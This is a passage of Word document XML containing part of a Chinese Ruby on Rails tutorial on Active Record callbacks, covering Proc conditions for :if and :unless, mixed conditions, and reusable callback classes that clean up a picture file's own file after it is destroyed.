                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "paid_with_card?"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="159058F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7B801ECE"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16.3 使用</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>作为</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2AC928"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最后，我们还可以将一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的参数传入。这种情况</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>最适合于判断条件是很短的校验函数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>通常是单行时使用</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7056"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2A407FF3" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D73FB5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Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="157E238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9E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>before_save</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :normalize_card_number,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2325D3A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9E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:if</w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>{ |order| order.paid_with_card? }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D36615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7795C2E"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16.4 回调前有多个条件判断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D20E7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当写有条件的回调时，可以</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">将 </w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="009E0A4C">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在同一个声明中同时混合使用</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2FC3B768" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7681456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Comment &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="584FF19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xml:space="preserve">  after_create :send_email_to_author, </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:if</w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :author_wants_emails?</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DF3BC7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9E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:unless</w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009E0A4C">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>{ |comment| comment.post.ignore_comments? }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A920B2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25FE681"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17 回调类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341A8E8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有时候，你写的一些回调十分有用甚至可以</w:t>
      </w:r>
      <w:r w:rsidRPr="004902E0">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>重用到其他的模型中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。而 </w:t>
      </w:r>
      <w:r w:rsidRPr="004902E0">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Active Record 可以让我们方便的将回调方法封装起来</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，以方便我们日后重用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DB66B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这里的例子中，我们为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PictureFile</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模型创建了一个含有 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调的类：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5736"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="27885FE8" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7100E48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4902E0">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>PictureFile</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Callbacks</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A4D068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2A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>after_destroy(picture_file)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07FF8AD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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>File.exists?(picture_file.filepath)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="717EE76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File.delete(picture_file.filepath)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C8006D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4693A81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29A484D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35D4052C"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如上所示，我们在类内部声明的回调方法需要接受一个模型对象作为参数。现在我们可以如下所示在模型中使用该回调：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5EDD055F" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21D7442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PictureFile &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A5F27F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4902E0">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004902E0">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>PictureFileCallbacks.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F8E3D9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6023E69A"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需要注意的是我们需要实例化一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PictureFileCallbacks</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象，因为我们声明的回调是实例方法。当我们需要使用该实例对象的状态时，这就会很有用。</w:t>
      </w:r>
      <w:r w:rsidRPr="009602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>通常来讲，将回调声明为一个类方法更加方便一些：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5736"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="107C510E" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C527AA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PictureFileCallbacks</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="633881A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9602C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>self</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r w:rsidRPr="009602C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(picture_file)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09D1EE5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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>File.exists?(picture_file.filepath)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B0FB7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File.delete(picture_file.filepath)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01AC9E4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56403E7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79AA2C8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C3E372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如果回调如上面一样声明为</w:t>
      </w:r>
      <w:r w:rsidRPr="009602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>类方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="009602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">就不需要实例化 </w:t>
      </w:r>
      <w:r w:rsidRPr="009602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>PictureFileCallbacks</w:t>
      </w:r>
      <w:r w:rsidRPr="009602C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象了。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4E2F5174" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49D71F1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PictureFile &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CD1D26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9602C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>after_destroy</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="009602C1">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
